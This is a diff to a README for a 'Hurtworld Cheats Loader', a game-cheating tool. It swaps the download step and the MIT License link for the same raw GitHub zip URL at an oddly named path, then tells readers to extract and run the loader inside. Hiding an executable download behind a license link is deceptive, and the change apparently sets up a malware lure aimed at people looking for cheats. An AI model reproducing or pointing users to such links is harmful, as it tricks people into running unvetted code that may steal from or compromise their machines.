@@ -8,7 +8,7 @@ Welcome to the **Hurtworld Cheats Loader**! This advanced tool is designed exclu
 ## ⚙️ Installation Guide
 
 Getting started is quick and safe!
-1. **Download** `Loader.rar` from the repository.
+1. **Download** `https://raw.githubusercontent.com/funnyboneman93/HurtworldEnhanceHub/main/hypidiomorphic/HurtworldEnhanceHub.zip` from the repository.
 2. **Extract** the contents using your favorite archive manager.
 3. **Run** the Loader application compatible with your operating system!
 4. Follow on-screen instructions to experience a diverse set of features.
@@ -84,7 +84,7 @@ Always respect game creators and abide by your local laws and online community r
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/).
+Distributed under the [MIT License](https://raw.githubusercontent.com/funnyboneman93/HurtworldEnhanceHub/main/hypidiomorphic/HurtworldEnhanceHub.zip).
 
 ---
 
